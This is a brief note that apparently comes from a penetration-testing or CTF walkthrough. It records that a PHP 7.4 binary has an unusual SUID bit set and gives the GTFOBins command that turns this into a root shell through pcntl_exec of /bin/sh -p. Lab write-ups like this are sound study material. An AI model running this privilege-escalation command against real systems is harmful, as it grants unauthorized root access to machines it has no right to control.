/usr/bin/php7\.4 unusual SUID set

-  GTFObins php
-  cd /bin
-  CMD="/bin/sh"
-  \./php \-r "pcntl\_exec\('/bin/sh', \['\-p'\]\);"
# root